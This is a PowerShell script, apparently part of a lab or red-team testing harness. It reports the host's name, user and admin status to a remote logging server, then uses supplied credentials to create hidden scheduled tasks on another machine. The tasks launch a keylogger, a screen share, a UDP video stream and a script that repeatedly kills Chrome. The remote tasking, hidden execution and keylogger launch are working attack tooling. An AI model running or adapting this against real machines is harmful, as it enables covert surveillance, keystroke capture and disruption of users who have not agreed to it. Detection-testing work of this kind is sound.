#
# Schedule a remote test
#
param($test)

function Send-Message($stage="Init", $state="Unknown", $duration="N/A", $comment="N/A")
{
	# Define session variables
	$hostname = $env:COMPUTERNAME
	$username = $env:USERNAME
	$domain = $env:USERDOMAIN
	$timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssK"
	$init_message = "[{0}] Hostname: {1}, Username: {2}\{3}, Admin: {4}, Elevated: {5}, Stage: {6}, State: {7}, Duration: {8}, Comment: {9}"
	#$init_message_json = '{{"timestamp": "{0}, "hostname": "{1}", "username": "{2}\{3}", "admin": {4}, "elevated": {5}, "stage": "{6}", "state": "{7}", "duration": "{8}", "comment": "{9}"}}'

	# Determine if this is an admin user, and if this session is elevated
	$admin_user = ($username -split "-")[1]

	if ($admin_user -ne $null)
	{
	$is_admin = $true
	$is_elevated = [bool]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
	} else
	{
	$is_admin = $false
	$is_elevated = [bool]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
	}

	# Debug output
	#write-host('')
	$message = ($init_message -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state, $duration, $comment)
	#write-host('')
	#$json_message = ($init_message_json -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state, $duration, $comment | convertto-json | convertfrom-json)
	write-host('')

	# Create TCP socket to logging server and send $tcp_message
	$remoteHost="172.25.0.181"
	$port=8443  

	try
	{
		Write-Host "Connecting to $remoteHost on port $port ... " -NoNewLine
		try
		{
			$socket = New-Object System.Net.Sockets.TcpClient( $remoteHost, $port )
			Write-Host -ForegroundColor Green "OK"
		}
		catch
		{
			Write-Host -ForegroundColor Red "failed"
			exit -1
		}

		$stream = $socket.GetStream( )
		$writer = New-Object System.IO.StreamWriter( $stream )
		# $buffer = New-Object System.Byte[] 1024
		# $encoding = New-Object System.Text.AsciiEncoding
		# $tcp_message = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($json_message))
		start-sleep -m 500
		write-host("Sending message: {0}" -f $message)
		$writer.WriteLine( $message )
		#write-host("Sending message: {0}" -f $json_message)
		#$writer.WriteLine( $json_message )
		$writer.Flush( )

	}
	finally
	{
		if( $writer ) {	$writer.Close( )	}
		if( $stream ) {	$stream.Close( )	}
	} 
}
# Checkin to logging server
Send-Message -stage remote-test -state starting

$server = "172.25.0.139"
$cred = Get-Credential

$scheduledTime = (Get-Date).AddMinutes(2).ToString("HH:mm")

Switch($test)
{
    screen-share {
        $taskName = "screen-share"
        $args = ":8080/wds",60,$taskName,"$scheduledTime"
        $scriptBlock = {
            param($dest,$duration, $taskName, $scheduledTime)
            $scheduledDay = Get-Date -Format ("MM/dd/yyyy")
            $sc_args = "powershell.exe -windowstyle hidden -File C:\Users\user\Desktop\scripts\vlc-screen-share.ps1 -dest $dest -duration $duration -schtask $taskName"
            schtasks.exe /create /tn $taskName /sc once /sd $scheduledDay /st $scheduledTime /ru builtin\users /tr "$sc_args"
        }
        break
    }
    keylogger {
        $taskName = "keylogger"
        $args = 120,$taskName,"$scheduledTime"
        $scriptBlock = {
            param($duration, $taskName, $scheduledTime)
            $scheduledDay = Get-Date -Format ("MM/dd/yyyy")
            $sc_args = "powershell.exe -windowstyle hidden -File C:\Users\user\Desktop\scripts\keylogger.ps1 -duration $duration -schtask $taskName"
            schtasks /create /tn $taskName /sc once /sd $scheduledDay /st $scheduledTime /ru "builtin\users" /tr "$sc_args"
        }
        break
    }
    terminate-processes {
        $taskName = "terminate-processes"
        $args = "chrome",5,30,10,$taskName,"$scheduledTime"
        $scriptBlock = {
            param($services, $minDelay, $maxDelay, $iterations, $taskName, $scheduledTime)
            $scheduledDay = Get-Date -Format ("MM/dd/yyyy")
            $sc_args = "powershell.exe -windowstyle hidden -File C:\Users\user\Desktop\scripts\terminate-processes.ps1 -services $services -minDelay $minDelay -maxDelay $maxDelay -iterations $iterations -schtask $taskName"
            schtasks /create /tn $taskName /sc once /sd $scheduledDay /st $scheduledTime /ru "builtin\users" /tr "$sc_args"
        }
        break
    }
    udp-stream {
        $taskName = "udp-stream"
        $args = "172.25.0.181:8080","C:\Users\user\Downloads\Rick%20Astley%20-%20Never%20Gonna%20Give%20You%20Up.mp4",60,$taskName,"$scheduledTime"
        $scriptBlock = {
            param($dest,$file,$duration, $taskName, $scheduledTime)
            $scheduledDay = Get-Date -Format ("MM/dd/yyyy")
            $sc_args = "powershell.exe -windowstyle hidden -File C:\Users\user\Desktop\scripts\vlc-udp-stream.ps1 -dest '$dest' -file '$file' -duration $duration -schtask $taskName"
            schtasks /create /tn $taskName /sc once /sd $scheduledDay /st $scheduledTime /ru "builtin\users" /tr "$sc_args"
        }
        break
    }
}


if ($test -ne $null)
{
    Invoke-Command -ComputerName $server -Credential $cred -ScriptBlock $scriptBlock -ArgumentList $args -ErrorVariable errorvar

    if ($errorvar[0].Exception -ne $null)
    {
        Send-Message -stage remote-test -state failed -comment "{error: $errorval}"
    }
    else
    {
        Send-Message -stage remote-test -state complete -comment "{taskname: $taskName, scheduled: $scheduledTime}"
    }
}
else
{
    write-host("A test needs to be defined") -ForegroundColor Red
    write-host("Available tests are:")
    write-host("* screen-share")
	write-host("* key-loger")
	write-host("* terminate-processes")
	write-host("* udp-stream")
}
